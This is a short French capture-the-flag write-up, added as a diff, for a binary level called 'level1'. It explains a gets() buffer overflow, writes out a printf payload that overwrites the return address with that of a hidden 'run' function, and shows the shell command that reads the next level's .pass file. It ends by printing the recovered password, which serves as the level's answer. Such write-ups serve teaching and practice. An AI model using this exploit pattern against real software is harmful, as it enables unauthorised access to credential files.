@@ -1,0 +1,18 @@
+On passe le binaire "level1" dans ghidra, on obtient les fonctions main et run.
+La fonction run n'est pas appelée mais permet d'executer des commande dans le terminal.
+La fonction main utilise la fonction "gets" qui est une fonction vulnerable aux overflows.
+
+En lisant le main on voit que le buffer donné à "gets" est limité a 76 caractères, il faut donc exploiter 
+l'overflow pour que la fonction "run" soit appelée en plaçant son adresse juste au momen d'overflow.
+
+pour récupérer l'adresse de la fonction run on utilise gdb:
+- gdb level1
+- disas run
+on nous donne l'adresse: 0x08048444, que l'on inverse en little endian pour obtenir 44 84 04 08
+
+- printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08" > /tmp/exploit
+- cat /tmp/exploit - | ./level1
+- appuyer sur entré
+- cat /home/user/level2/.pass
+
+on obtient le résultat: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
